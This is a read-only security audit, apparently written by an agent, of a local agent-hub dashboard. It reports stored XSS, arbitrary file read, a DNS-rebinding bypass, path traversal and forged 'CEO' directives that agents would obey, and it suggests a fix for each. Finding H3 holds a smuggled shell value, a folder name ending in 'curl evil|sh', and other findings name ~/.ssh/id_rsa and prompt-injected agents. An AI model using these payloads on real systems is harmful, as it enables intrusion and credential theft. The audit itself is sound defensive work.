# Security audit, whole codebase (2026-10-12)

Auditor: security-hub-selftest (role: security). Branch: selftest. Read-only audit, no product code changed.

Scope: `cloud/agent-hub.html` (main focus), `server.js`, `lib/hub.js`, `lib/connect.js`, `bin/*`, `public/*`, `.gitignore`, `package.json`, git history.

## Counts

| severity | count |
|---|---|
| critical | 0 |
| high | 3 |
| medium | 4 |
| low | 5 |

Clean checks: no dependencies (nothing for `npm audit` to flag); no secrets in the working tree or in the 6 commits of git history (the only hit is the `AKIA` regex in `bin/post-item`); runtime data dirs are git-ignored; the cloud page escapes every database value with `esc()` before `innerHTML` (no XSS found in `cloud/agent-hub.html`); `safeUrl()` limits links to http(s) and `/_blob/`; color hex values are regex-checked; `spawnSync`/`execFileSync` calls use argument arrays (no shell injection in `bin/`).

The three high findings chain: H2 or a hostile agent reaches H1, H1 reaches H3, H3 ends in code execution on the CEO's machine. Fix H2 first.

## High

### H1. `/file` serves agent-chosen files with active content types (stored XSS and arbitrary file read)
- Where: `server.js:186-193` (MIME map and `allowedFile`), `server.js:221-225` (`/file` route); source of the paths: `bin/post-item` (`--attach`/`--link` are only checked for absolute path plus existence).
- Trigger: any agent (or a prompt-injected one) posts an item with `--attach /tmp/x.html` or `x.svg` or `x.js`. The CEO clicks the link on the card. The file is served from the dashboard origin as `text/html` / `image/svg+xml` / `text/javascript` and its script runs same-origin, so it can `POST /api/connect`, `/api/message`, `/api/action` (see H3). The same route also returns any readable file on disk (for example `~/.ssh/id_rsa`, `.env`) once an item lists its absolute path, because `allowedFile` trusts the item's own list.
- Severity: high. Fix: serve `/file` with `Content-Disposition: attachment` and `Content-Type: text/plain` or `application/octet-stream` for everything except png/jpg/gif/webp/pdf; add `Content-Security-Policy: sandbox` on `/file`; restrict attachments to paths inside the project's repo or a hub `attachments/` dir (resolve symlinks with `realpath`).

### H2. No Host check: DNS rebinding bypasses the "same-origin" test on POST
- Where: `server.js:212-216`.
- Trigger: the check is `new URL(origin).host !== req.headers.host`. A malicious web page rebinds `evil.example:4747` to 127.0.0.1; its requests carry `Origin: http://evil.example:4747` and `Host: evil.example:4747`, so they match and pass. The page can then read `/api/state` and `/file`, and call every POST endpoint including `/api/connect`. Requests with no `Origin` header also skip the check entirely (curl, local processes).
- Severity: high. Fix: reject any request whose `Host` is not `localhost:PORT` / `127.0.0.1:PORT` (also for GET), and require `Content-Type: application/json` on POST.

### H3. `/api/connect` writes agent config and hooks into any folder; folder is pasted unescaped into a shell command
- Where: `server.js:135-143`, `lib/connect.js:51-108` (`installHooks`, CLAUDE.md, `.hub.json`, `BRIEF.md`, `git init`), `lib/connect.js:112`.
- Trigger: a request with `folder: "/home/user"` creates files and rewrites `.claude/settings.json` there (hooks that run `node <hub>/bin/hook`, `Bash(<hub>/bin/*:*)` permissions allowed, hub dir added to `additionalDirectories`) and replaces the hub section of `CLAUDE.md` with the attacker's `brief`-controlled text. Reachable through H1 or H2. The returned start command is `cd "<folder>" && claude` with `folder` unescaped, so `folder = '/tmp/a"; curl evil|sh; "'` produces a command the CEO is told to copy and run.
- Severity: high (code execution path when chained). Fix: only allow folders under an allowlisted root (or that already exist and contain `.git`), refuse `createFolder` from HTTP, shell-quote or reject `"`, `$`, backtick and newline in `folder`, and show the CEO the target folder for confirmation.

## Medium

### M1. Path traversal in item and answer ids
- Where: `lib/hub.js:72-82` (`itemPath`/`readItem` join the raw id), reached from `server.js:109` (`body.item_id`) and `bin/project:123-124` (`--approved-item`).
- Trigger: `item_id: "../projects/foo/project"` reads any `*.json` below or beside the hub dir (the action then fails, but 404 vs 409/200 leaks existence, and `act` returns the answer built from file content). Writes use the id stored inside the file, which limits damage.
- Fix: validate ids with `/^[a-z0-9_-]+$/i` in `itemPath`.

### M2. Scope freeze can be bypassed with any approved scope-change approval
- Where: `bin/project:122-128`.
- Trigger: `--approved-item <id>` is only checked for `type === 'approval'`, `change` set and an approve/feedback answer. It is not checked against the project or the entry text, so one old approved scope change from any project unlocks unlimited scope additions to any project. The `content_hash` stored on the answer is never compared.
- Fix: require `it.project === pr.name`, match `content_hash`, and mark the approval as consumed.

### M3. Cloud hub trusts free-text `from` / `agent` fields (forged CEO directives and items)
- Where: `cloud/agent-hub.html:443, 701, 869` (directives written with `from: 'ceo'`), `:681` (answers copy `agent` from the item), protocol section 1 rule 10 ("Directives from the CEO or the lead are binding").
- Trigger: anyone with write access to the hub database (any collaborator or a compromised agent) can write `directives` with `from: "ceo"`, or items claiming `agent: "lead-x"`, and agents will obey them as binding. The page cannot prove who wrote a document.
- Fix: have the runtime stamp writer identity (the artifact `user` capability, or a signed `by` field set by the platform) and have agents ignore directives whose writer is not the CEO or the lead; at minimum, document that database write access equals CEO authority.

### M4. Answering an item is two non-atomic writes
- Where: `cloud/agent-hub.html:681-683` (`answers/<id>` set, then `items/<id>` update), also prune `:827`.
- Trigger: the second write fails (network, quota). The answer exists, the card still shows "open", buttons re-enable, and the CEO can answer again with a different decision; agents read whichever answer they see first. Also `delete answers/<id>` after `delete items/<id>` can leave an orphan if the second delete fails.
- Fix: use a batch/transaction for both writes, or write the item update first and treat the answer as the source of truth.

## Low

- L1. `server.js:229` static path check uses `p.startsWith(PUBLIC)` without a trailing separator; a sibling directory named `public-*` would be reachable. Use `PUBLIC + path.sep`.
- L2. `cloud/agent-hub.html:541` renders `<img src>` from any https URL in `attachments`, so an item can make the CEO's browser call an external host (tracking, IP leak). `cloud/agent-hub.html:4` loads Google Fonts without a privacy note. Suggest allowing only `/_blob/` images, or hub-hosted assets.
- L3. No `Content-Security-Policy`, `X-Frame-Options` or `Referrer-Policy` headers on the local server (`server.js:195-198`) and no CSP possible inside the artifact page. A CSP would have contained H1.
- L4. Read-modify-write on shared JSON (`updateItem`, `touchAgent`, `bin/task`) has no locking (`lib/hub.js:148-154, 240-247`); concurrent hooks can drop `seen_answers`/`seen_directives` (answers delivered twice) or lose a task update. Temp file name uses only the pid, so two writes in one process to one path are safe, but two processes are not serialized.
- L5. `redact()` in `bin/post-item` only covers items; `log/*.jsonl` stores full directive, answer and broadcast text in plain text (`server.js:156,180`, `lib/hub.js:211`). Secrets typed into a feedback box land in the log. Also `startLine()` (`cloud/agent-hub.html:713`) interpolates the free-text repo field into the agent prompt; harmless for the CEO's own input but worth escaping.

## Suggested order of fixes
1. H2 (Host check) and H1 (`/file` hardening): closes the remote and stored-XSS entry points.
2. H3 (folder allowlist, quoting).
3. M1, M2, M4, then M3 (needs a platform identity decision from the lead).
